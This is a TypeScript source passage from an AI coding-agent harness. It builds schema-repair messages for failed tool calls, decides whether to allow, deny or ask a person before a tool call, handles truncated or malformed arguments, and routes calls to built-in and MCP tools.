// tool's schema was answered by whatever the tool said first, and for a
// misnamed key that is a false premise. `edit {file_path, old_string,
// new_string}` -- the spelling another harness teaches -- reached editTool
// as an empty path and came back "` is a directory, not a file", and
// `read {file_path}` came back "Nothing was given". Told that, a model
// invents a different wrong call. What it needs is the parameter list.
//
// Only on a call that already failed, and only when its arguments really do
// disagree with the schema: a success, and a failure whose arguments were
// well-formed, reach the model byte for byte as before (tool_hygiene.test.ts
// pins both). No model call is added; the text rides on the answer the
// failed call already gets. Built-in tools only -- an MCP server validates
// its own arguments and says so itself.

/** How a schema type reads in one line: `string`, `"a" | "b"`, `array of {content: string}`. */
function typeText(spec: unknown): string {
  const s = (spec ?? {}) as Record<string, unknown>;
  if (Array.isArray(s.enum)) return s.enum.map((v) => JSON.stringify(v)).join(" | ");
  if (s.type === "array") return s.items ? `array of ${typeText(s.items)}` : "array";
  if (s.type === "object" && s.properties && typeof s.properties === "object") {
    const req = new Set(Array.isArray(s.required) ? (s.required as string[]) : []);
    return `{${Object.entries(s.properties as Record<string, unknown>)
      .map(([k, v]) => `${k}${req.has(k) ? "" : "?"}: ${typeText(v)}`)
      .join(", ")}}`;
  }
  return typeof s.type === "string" ? s.type : "any";
}

/**
 * The parameters a built-in tool takes, in one line --
 * `path (string, required), old_text (string, required), …` -- or null for a
 * name with no schema in this build.
 */
export function toolParamsText(name: string, readWindow?: number, editVariant?: EditVariant): string | null {
  const params = parametersFor(name, readWindow, editVariant);
  const props = (params?.properties ?? undefined) as Record<string, unknown> | undefined;
  if (!props) return null;
  const req = new Set(Array.isArray(params!.required) ? (params!.required as string[]) : []);
  const list = Object.entries(props).map(
    ([k, v]) => `${k} (${typeText(v)}${req.has(k) ? ", required" : ""})`
  );
  return list.length > 0 ? list.join(", ") : "no parameters";
}

/** The JSON type of a value, with integers told apart from other numbers. */
function jsonType(v: unknown): string {
  if (v === null) return "null";
  if (Array.isArray(v)) return "array";
  if (typeof v === "number") return Number.isInteger(v) ? "integer" : "number";
  return typeof v;
}

export interface ArgProblems {
  /** Required parameters the call did not send. */
  missing: string[];
  /** Parameters sent with a value of the wrong JSON type. */
  wrongType: Array<{ key: string; want: string; got: string }>;
  /** Keys the call sent that the tool does not take. */
  unknown: string[];
}

/**
 * Where a call's arguments disagree with a built-in tool's schema, top-level
 * keys only. Null when the tool has no schema in this build. The parser's own
 * markers (`__gnomon_args_*`) are not the model's keys and are skipped.
 */
export function argProblems(
  name: string,
  args: Record<string, unknown>,
  readWindow?: number,
  editVariant?: EditVariant
): ArgProblems | null {
  const params = parametersFor(name, readWindow, editVariant);
  const props = (params?.properties ?? undefined) as Record<string, Record<string, unknown>> | undefined;
  if (!props) return null;
  const required = Array.isArray(params!.required) ? (params!.required as string[]) : [];
  const missing = required.filter((k) => args[k] === undefined);
  const wrongType: ArgProblems["wrongType"] = [];
  const unknown: string[] = [];
  for (const [k, v] of Object.entries(args)) {
    if (k.startsWith("__gnomon_")) continue;
    const spec = props[k];
    if (!spec) {
      unknown.push(k);
      continue;
    }
    const want = typeof spec.type === "string" ? spec.type : undefined;
    if (!want || v === undefined) continue;
    const got = jsonType(v);
    if (got !== want && !(want === "number" && got === "integer")) wrongType.push({ key: k, want, got });
  }
  return { missing, wrongType, unknown };
}

const ticked = (keys: string[]) => keys.map((k) => `\`${k}\``).join(", ");

/**
 * The paragraph appended to a failed call whose arguments do not match the
 * schema, or "" when they do (or the tool has none). Unknown keys alone do not
 * trigger it -- every tool ignores an extra key, so a call that failed with one
 * failed for another reason -- but they are named when it fires, because a
 * misnamed key is the usual reason a required one is missing.
 */
export function schemaRepairText(
  name: string,
  args: Record<string, unknown>,
  readWindow?: number,
  editVariant?: EditVariant
): string {
  const p = argProblems(name, args, readWindow, editVariant);
  if (!p || (p.missing.length === 0 && p.wrongType.length === 0)) return "";
  const parts: string[] = [];
  if (p.missing.length > 0) parts.push(`missing ${ticked(p.missing)}`);
  for (const w of p.wrongType) parts.push(`\`${w.key}\` must be ${w.want}, not ${w.got}`);
  if (p.unknown.length > 0) {
    parts.push(
      `${ticked(p.unknown)} ${p.unknown.length === 1 ? "is not a parameter" : "are not parameters"} of ${name}`
    );
  }
  return (
    `\n\nYour ${name} call does not match its parameters: ${parts.join("; ")}. ` +
    `${name} takes one JSON object: ${toolParamsText(name, readWindow, editVariant)}.`
  );
}

/**
 * A failed outcome with the schema's repair text appended, when the call's
 * arguments are why it failed. A success, or a failure whose arguments match
 * the schema, is returned as it was -- the same object.
 */
function withSchemaRepair(
  name: string,
  args: Record<string, unknown>,
  outcome: ToolOutcome,
  readWindow?: number,
  editVariant?: EditVariant
): ToolOutcome {
  if (outcome.code === TOOL_OK || outcome.code === TOOL_OK_EMPTY) return outcome;
  const text = schemaRepairText(name, args, readWindow, editVariant);
  return text ? { ...outcome, content: outcome.content + text } : outcome;
}

// ---------------------------------------------------------------------------
// The decision alone
// ---------------------------------------------------------------------------



/** The tools whose calls `toolCallPolicy` decides. Everything else has no pre-execution rule. */
export const POLICY_TOOLS = ["bash", "write", "edit", "read", "webfetch"] as const;
export type PolicyTool = (typeof POLICY_TOOLS)[number];

export interface PolicyDecision {
  decision: "allow" | "deny" | "ask";
  /** The rule that refused, "approval" for the gate, null when nothing stopped the call. */
  rule: PolicyRule | "approval" | null;
  /** In words, for whoever is told: the model on deny, the person on ask. */
  reason: string;
  /** The bash_allow / bash_deny pattern, when one decided. */
  pattern?: string;
  /** The tool outcome code the loop would have returned, on deny. */
  code?: number;
}

/**
 * What this loop would do with a tool call, decided without doing it.
 *
 * Every answer comes from the code the tool itself runs first -- the role's
 * tool list, then the tool's precheck (bashPrecheck, writePrecheck,
 * readPrecheck, webfetchPrecheck), then needsApproval under ctx.gate. So
 * `gnomon guard` and the loop cannot disagree about a call: there is one copy
 * of each rule, and both callers reach it.
 *
 *   deny   the loop refuses it (a refusal code, 2-4) and never asks
 *   ask    the loop would ask the person before running it
 *   allow  the loop would run it without asking. Including a call the tool
 *          would then fail on its own (an empty command): failing is not
 *          refusing, and the reason says so.
 *
 * Only the POLICY_TOOLS are decided; anything else is an error to the caller,
 * never a silent allow.
 */
export async function toolCallPolicy(
  name: string,
  args: Record<string, unknown>,
  ctx: ToolContext,
  offered: Set<string>
): Promise<PolicyDecision> {
  const deny = (r: Precheck): PolicyDecision => ({
    decision: "deny",
    rule: r.rule ?? null,
    reason: r.content,
    code: r.code,
    ...(r.pattern ? { pattern: r.pattern } : {}),
  });
  if (!offered.has(name)) return deny(notOffered(name, offered));
  let pre: Precheck | null;
  switch (name) {
    case "bash":
      pre = bashPrecheck(args, ctx);
      break;
    case "write":
    case "edit": {
      const w = writePrecheck(name, args, ctx);
      pre = "refusal" in w ? w.refusal : null;
      break;
    }
    case "read": {
      const r = readPrecheck(args, ctx);
      pre = "refusal" in r ? r.refusal : null;
      break;
    }
    case "webfetch": {
      const f = await webfetchPrecheck(args, ctx);
      pre = "refusal" in f ? f.refusal : null;
      break;
    }
    default:
      throw new Error(`no pre-execution policy for "${name}" (decided: ${POLICY_TOOLS.join(", ")})`);
  }
  if (pre?.rule) return deny(pre);
  if (pre) {
    return { decision: "allow", rule: null, reason: `no rule refuses it; the call itself would fail: ${pre.summary}` };
  }
  // A call that runs repository-defined code says so to whoever is asked, and
  // under `[approval] repo_code = true` it is asked whatever the gate says.
  const runs = name === "bash" && typeof args.command === "string" ? repoCodeRuns(args.command) : [];
  const note = runs.length > 0 ? ` It ${repoCodeNote(runs, ctx.root).join("; ").trim()}.` : "";
  if (runs.length > 0 && repoCodeAsks(ctx)) {
    return {
      decision: "ask",
      rule: "repo_code",
      reason: `[approval] repo_code = true asks a person before a call that runs code the repository defines.${note}`,
    };
  }
  if (needsApproval(name, ctx.gate)) {
    return {
      decision: "ask",
      rule: "approval",
      reason: `[approval] gate = "${ctx.gate}" asks a person before ${ctx.gate === "always" ? "every" : "every mutating"} call — this is a ${name} call${note ? `.${note}` : ""}`,
    };
  }
  return { decision: "allow", rule: null, reason: `no rule refuses it${note ? `.${note}` : ""}` };
}

export async function executeTool(
  name: string,
  args: Record<string, unknown>,
  ctx: ToolContext,
  offered: Set<string>
): Promise<ToolOutcome> {
  if (!offered.has(name)) return outcomeOf(notOffered(name, offered));

  // A call the endpoint never finished emitting. Named as such rather than
  // dispatched with the arguments stripped: a truncated `read {"path": "src/ma`
  // used to arrive as `read {}` and come back "read needs a `path`. Nothing was
  // given", which is a true sentence about a false premise -- the model DID
  // give one, and the wire cut it off. Told an argument is missing it invents
  // one; told the call was truncated it re-emits it.
  const truncated = args[ARGS_TRUNCATED];
  if (typeof truncated === "string") {
    const shown = truncated.length > 200 ? `${truncated.slice(0, 200)}…` : truncated;
    return {
      code: TOOL_FAILED,
      content:
        `Your ${name} call did not arrive complete: its arguments were cut off ` +
        `mid-JSON after ${truncated.length} characters, so no argument could be ` +
        `read and NOTHING RAN. This is a transport truncation, not a mistake in ` +
        `what you asked for. Send the same call again, shorter if it was long.\n` +
        `Received: ${shown}`,
      summary: `${name} — arguments truncated in transit (${truncated.length} chars)`,
    };
  }

  // Arguments that arrived whole and could not be read. Refused rather than
  // dispatched: stripped to `{}`, `read {'path': 'a'}` would come back
  // "read needs a `path`", the same true-sentence-false-premise as above. The
  // parse error goes back verbatim because it names the position and the
  // fault, which is the one thing the model needs to write it correctly.
  const malformed = args[ARGS_MALFORMED] as { raw?: unknown; error?: unknown } | undefined;
  if (malformed && typeof malformed === "object") {
    const raw = typeof malformed.raw === "string" ? malformed.raw : JSON.stringify(malformed.raw);
    const shown = raw.length > 200 ? `${raw.slice(0, 200)}…` : raw;
    const error = String(malformed.error ?? "not a JSON object");
    // "Whose keys are this tool's parameters" told the model there was a list
    // without giving it. Named here, so the corrected call can use them.
    const params = toolParamsText(name, ctx.maxLines?.read, ctx.editVariant);
    return {
      code: TOOL_DENIED,
      content:
        `Your ${name} call's arguments could not be read (${error}), so NOTHING ` +
        `RAN. Arguments must be ONE JSON object whose keys are this tool's ` +
        `parameters: double-quoted keys and strings, newlines inside strings ` +
        `escaped as \\n. Re-issue the ${name} call with corrected arguments.\n` +
        (params ? `${name} takes: ${params}.\n` : "") +
        `Received: ${shown}`,
      summary: `${name} — malformed arguments (${error.slice(0, 80)})`,
    };
  }

  // A throw here would take the whole session down: an unguarded
  // readFileSync on a directory (EISDIR) once killed a live run outright.
  // A broken tool is an apparatus_failure the model can be told about.
  let outcome: ToolOutcome;
  try {
    outcome = await dispatch(name, args, ctx);
  } catch (err) {
    const msg = err instanceof Error ? err.message : String(err);
    outcome = {
      code: TOOL_FAILED,
      content: `Tool "${name}" failed: ${msg}`,
      summary: `${name} — ${msg}`,
    };
  }
  // Error path only: a call that failed with arguments the schema does not
  // accept is told which parameters the tool takes. Anything else is returned
  // untouched.
  return withSchemaRepair(name, args, outcome, ctx.maxLines?.read, ctx.editVariant);
}

async function dispatch(
  name: string,
  args: Record<string, unknown>,
  ctx: ToolContext
): Promise<ToolOutcome> {
  // MCP tools are named `mcp__<server>__<tool>` and routed to their server.
  if (name.startsWith("mcp__")) {
    if (!ctx.mcp) {
      return {
        code: TOOL_NOT_DECLARED,
        content: `Refused: "${name}" is an MCP tool, but no MCP server is connected.`,
        summary: `${name} — no mcp`,
      };
    }
    // An MCP call reaches an arbitrary third-party server with model-chosen
    // args — the tool class most likely to have external side effects, and the
    // only one that used to run ungated. Gate it like a mutating built-in:
    // prompt under on_write and always, proceed silently only under `never`.
    if (ctx.gate !== "never") {
      const ok = await ctx.approve({
        tool: name,
        summary: `${name} — MCP call`,
        preview: [JSON.stringify(args).slice(0, 2000)],
      });
      if (!ok) {
        return {
          code: TOOL_DENIED,
          content: `Refused: the user declined the ${name} call.`,
          summary: `${name} — denied`,
        };
      }
    }
    const r = await ctx.mcp.call(name, args);
    return {
      code: r.isError ? TOOL_FAILED : TOOL_OK,
      content: r.content,
      summary: `${name} — ${r.isError ? "error" : "ok"}`,
    };
  }
  switch (name) {
    case "read":
      return readTool(args, ctx);
    case "bash":
      return withPackageIndex(await bashTool(args, ctx), args, ctx);
    case "task":
      return taskTool(args, ctx);
    case "webfetch":
      return webfetchTool(args, ctx);
    case "todo":
      return todoTool(args, ctx);
    case "note":
      return noteTool(args, ctx);
    case "compute":
      return computeTool(args, ctx);
    case "glob":
      return globTool(args, ctx);
    case "grep":
      return grepTool(args, ctx);
    case "write":
      return writeTool(args, ctx);
    case "edit":
      return editTool(args, ctx);
    case "skill":
      return skillTool(args, ctx);
    default:
      return {
        code: TOOL_NOT_DECLARED,
        content: `Refused: "${name}" is declared but not implemented by this build.`,
        summary: `${name} — not implemented`,
      };
  }
}
